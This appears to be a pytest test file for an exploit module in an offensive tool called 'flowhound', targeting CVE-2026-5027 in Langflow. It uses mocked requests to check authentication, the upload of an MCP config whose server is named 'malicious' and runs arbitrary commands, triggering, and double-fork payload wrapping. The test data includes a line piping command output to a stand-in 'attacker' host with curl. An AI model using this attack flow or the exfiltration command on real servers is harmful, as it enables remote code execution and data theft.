"""Tests for flowhound.vulnerabilities.exploits.cve_2026_5027."""

from unittest.mock import MagicMock, patch

from flowhound.vulnerabilities.exploits.cve_2026_5027 import Exploit

_BASE_URL = "http://localhost:7860"
_AUTH_HEADERS = {
    "Authorization": "Bearer test-token",
    "Content-Type": "application/json",
}


def _mock_resp(status: int = 200, json_data=None, text: str = "ok"):
    resp = MagicMock()
    resp.status_code = status
    resp.text = text
    if json_data is not None:
        resp.json.return_value = json_data
    return resp


def _mock_auth_post(status: int = 200):
    resp = MagicMock()
    resp.status_code = status
    resp.json.return_value = {"access_token": "test-token"}
    return resp


def _mock_auto_login_disabled():
    resp = MagicMock()
    resp.status_code = 403
    resp.json.return_value = {}
    return resp


# ---------------------------------------------------------------------------
# get_uuid
# ---------------------------------------------------------------------------


class TestGetUuid:
    def test_success(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
            return_value=_mock_resp(200, {"id": "abc-123"}),
        ):
            assert exploit.get_uuid(base_url=_BASE_URL, auth=_AUTH_HEADERS) == "abc-123"

    def test_non_200_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
            return_value=_mock_resp(401, {"detail": "unauthorized"}),
        ):
            assert exploit.get_uuid(base_url=_BASE_URL, auth=_AUTH_HEADERS) is None

    def test_missing_id_field_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
            return_value=_mock_resp(200, {"user": "admin"}),
        ):
            assert exploit.get_uuid(base_url=_BASE_URL, auth=_AUTH_HEADERS) is None

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
            side_effect=ConnectionError("refused"),
        ):
            assert exploit.get_uuid(base_url=_BASE_URL, auth=_AUTH_HEADERS) is None


# ---------------------------------------------------------------------------
# upload_file
# ---------------------------------------------------------------------------


class TestUploadFile:
    def test_returns_json_on_success(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
            return_value=_mock_resp(200, {"path": "/uploads/file.json"}),
        ):
            result = exploit.upload_file(
                auth=_AUTH_HEADERS,
                url=_BASE_URL,
                uuid="uuid-1",
                command="python3 -c 'x = 1'",
            )
        assert result == {"path": "/uploads/file.json"}

    def test_args_included_in_json_when_provided(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
            return_value=_mock_resp(200, {"path": "/uploads/file.json"}),
        ) as mock_post:
            exploit.upload_file(
                auth=_AUTH_HEADERS,
                url=_BASE_URL,
                uuid="uuid-1",
                command="bash",
                args=["-c", "id"],
            )
        import json as _json

        file_content = mock_post.call_args.kwargs["files"]["file"][1]
        parsed = _json.loads(file_content)
        assert parsed["mcpServers"]["malicious"]["args"] == ["-c", "id"]

    def test_args_omitted_from_json_when_empty(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
            return_value=_mock_resp(200, {"path": "/uploads/file.json"}),
        ) as mock_post:
            exploit.upload_file(
                auth=_AUTH_HEADERS,
                url=_BASE_URL,
                uuid="uuid-1",
                command="id",
                args=[],
            )
        import json as _json

        file_content = mock_post.call_args.kwargs["files"]["file"][1]
        parsed = _json.loads(file_content)
        assert "args" not in parsed["mcpServers"]["malicious"]

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
            side_effect=ConnectionError("refused"),
        ):
            assert (
                exploit.upload_file(
                    auth=_AUTH_HEADERS, url=_BASE_URL, uuid="uuid-1", command="id"
                )
                is None
            )


# ---------------------------------------------------------------------------
# trigger_vuln
# ---------------------------------------------------------------------------


class TestTriggerVuln:
    def test_returns_true_on_200(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
            return_value=_mock_resp(200),
        ):
            assert exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS) is True

    def test_returns_false_on_non_200(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
            return_value=_mock_resp(403),
        ):
            assert exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS) is False

    def test_network_error_returns_none(self):
        exploit = Exploit()
        with patch(
            "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
            side_effect=ConnectionError("refused"),
        ):
            assert exploit.trigger_vuln(base_url=_BASE_URL, auth=_AUTH_HEADERS) is None


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# _double_fork_wrap
# ---------------------------------------------------------------------------


class TestDoubleForkWrap:
    def test_output_contains_fork(self):
        result = Exploit._double_fork_wrap("pass")
        assert "_os.fork()" in result

    def test_output_contains_setsid(self):
        result = Exploit._double_fork_wrap("pass")
        assert "_os.setsid()" in result

    def test_payload_indented_inside_grandchild_block(self):
        result = Exploit._double_fork_wrap("import socket")
        # Payload line must appear indented inside the grandchild if-block
        assert "        import socket" in result

    def test_child_exits_with_os_exit(self):
        result = Exploit._double_fork_wrap("pass")
        assert "_os._exit(0)" in result

    def test_parent_waits_for_child(self):
        result = Exploit._double_fork_wrap("pass")
        assert "_os.waitpid(_pid, 0)" in result

    def test_multiline_payload_all_indented(self):
        code = "import os\nos.system('id')"
        result = Exploit._double_fork_wrap(code)
        assert "        import os\n" in result
        assert "        os.system('id')\n" in result


# ---------------------------------------------------------------------------
# _needs_shell_wrap
# ---------------------------------------------------------------------------


class TestNeedsShellWrap:
    def test_redirect_detected(self):
        assert Exploit._needs_shell_wrap("echo 'pwned' > pwned.txt") is True

    def test_append_redirect_detected(self):
        assert Exploit._needs_shell_wrap("echo hi >> out.txt") is True

    def test_pipe_detected(self):
        assert Exploit._needs_shell_wrap("id | curl -d @- http://attacker") is True

    def test_semicolon_detected(self):
        assert Exploit._needs_shell_wrap("id; whoami") is True

    def test_ampersand_detected(self):
        assert Exploit._needs_shell_wrap("sleep 10 &") is True

    def test_plain_command_not_wrapped(self):
        assert Exploit._needs_shell_wrap("id") is False

    def test_command_with_safe_args_not_wrapped(self):
        assert Exploit._needs_shell_wrap("curl -s http://localhost/pwned") is False


# ---------------------------------------------------------------------------
# _parse_command
# ---------------------------------------------------------------------------


class TestParseCommand:
    def test_simple_command_no_args(self):
        result = Exploit._parse_command("id")
        assert result is not None
        cmd, args = result
        assert cmd == "id"
        assert args == []

    def test_command_with_args(self):
        result = Exploit._parse_command("bash -c 'id'")
        assert result is not None
        cmd, args = result
        assert cmd == "bash"
        assert args == ["-c", "id"]

    def test_python_dash_c_with_code(self):
        code = "import os; os.system('id')"
        shell_command = f"python3 -c {code!r}"
        result = Exploit._parse_command(shell_command)
        assert result is not None
        cmd, args = result
        assert cmd == "python3"
        assert args == ["-c", code]

    def test_empty_string_returns_original(self):
        result = Exploit._parse_command("")
        assert result is not None
        cmd, args = result
        assert cmd == ""
        assert args == []

    def test_multiword_no_quotes(self):
        result = Exploit._parse_command("curl -s http://localhost")
        assert result is not None
        cmd, args = result
        assert cmd == "curl"
        assert args == ["-s", "http://localhost"]

    def test_unmatched_quote_returns_none(self):
        assert Exploit._parse_command("echo 'unterminated") is None


# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------


class TestExploit:
    def test_auth_failure_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(401),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="wrong")
                is False
            )

    def test_uuid_failure_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
                return_value=_mock_resp(401, {"detail": "unauth"}),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                is False
            )

    def test_upload_failure_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
                return_value=_mock_resp(200, {"id": "uid-123"}),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
                side_effect=ConnectionError("refused"),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                is False
            )

    def test_trigger_failure_returns_false(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
                side_effect=[_mock_resp(200, {"id": "uid-123"}), _mock_resp(403)],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
                return_value=_mock_resp(200, {"path": "file.json"}),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                is False
            )

    def test_full_success(self):
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
                side_effect=[_mock_resp(200, {"id": "uid-123"}), _mock_resp(200)],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
                return_value=_mock_resp(200, {"path": "file.json"}),
            ),
        ):
            assert (
                exploit.exploit(base_url=_BASE_URL, username="admin", password="secret")
                is True
            )

    def test_uses_non_bash_payload(self):
        """Payloads with raw_command=None use python3 -c + double-fork wrapping."""
        from flowhound.vulnerabilities.payloads.base_payload_class import (
            PayloadBaseClass,
        )

        payload = MagicMock(spec=PayloadBaseClass)
        payload.raw_command = None  # not a raw-command payload
        payload.load_payload.return_value = "import os; os.system('id')"
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
                side_effect=[_mock_resp(200, {"id": "uid-123"}), _mock_resp(200)],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
                return_value=_mock_resp(200, {"path": "file.json"}),
            ) as mock_post,
        ):
            assert (
                exploit.exploit(
                    base_url=_BASE_URL,
                    username="admin",
                    password="secret",
                    payload=payload,
                )
                is True
            )
        payload.load_payload.assert_called_once()
        file_content = mock_post.call_args.kwargs["files"]["file"][1]
        import json as _json

        parsed = _json.loads(file_content)
        server = parsed["mcpServers"]["malicious"]
        assert server["command"] == "python3"
        assert server["args"][0] == "-c"
        # Double-fork boilerplate must be present in the code argument
        code_arg = server["args"][1]
        assert "_os.fork()" in code_arg
        assert "_os.setsid()" in code_arg
        # Single quotes inside payload code must survive intact (not shell-escaped)
        assert "import os; os.system('id')" in code_arg

    def test_execute_bash_command_plain_uses_raw(self):
        """execute_bash_command payload with no metacharacters: command used directly."""
        from flowhound.vulnerabilities.payloads.execute_bash_command import (
            Payload as BashPayload,
        )

        payload = BashPayload(cmd="id")
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
                side_effect=[_mock_resp(200, {"id": "uid-123"}), _mock_resp(200)],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
                return_value=_mock_resp(200, {"path": "file.json"}),
            ) as mock_post,
        ):
            exploit.exploit(
                base_url=_BASE_URL,
                username="admin",
                password="secret",
                payload=payload,
            )
        import json as _json

        file_content = mock_post.call_args.kwargs["files"]["file"][1]
        parsed = _json.loads(file_content)
        assert parsed["mcpServers"]["malicious"]["command"] == "id"
        assert "args" not in parsed["mcpServers"]["malicious"]

    def test_execute_bash_command_with_redirect_uses_bash_wrap(self):
        """execute_bash_command payload with redirect: wrapped in bash -c."""
        from flowhound.vulnerabilities.payloads.execute_bash_command import (
            Payload as BashPayload,
        )

        payload = BashPayload(cmd="echo 'pwned' > pwned.txt")
        exploit = Exploit()
        with (
            patch(
                "flowhound.vulnerabilities.clients.langflow.get",
                return_value=_mock_auto_login_disabled(),
            ),
            patch(
                "flowhound.vulnerabilities.clients.langflow.post",
                return_value=_mock_auth_post(),
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.get",
                side_effect=[_mock_resp(200, {"id": "uid-123"}), _mock_resp(200)],
            ),
            patch(
                "flowhound.vulnerabilities.exploits.cve_2026_5027.post",
                return_value=_mock_resp(200, {"path": "file.json"}),
            ) as mock_post,
        ):
            exploit.exploit(
                base_url=_BASE_URL,
                username="admin",
                password="secret",
                payload=payload,
            )
        import json as _json

        file_content = mock_post.call_args.kwargs["files"]["file"][1]
        parsed = _json.loads(file_content)
        assert parsed["mcpServers"]["malicious"]["command"] == "bash"
        assert parsed["mcpServers"]["malicious"]["args"] == [
            "-c",
            "echo 'pwned' > pwned.txt",
        ]
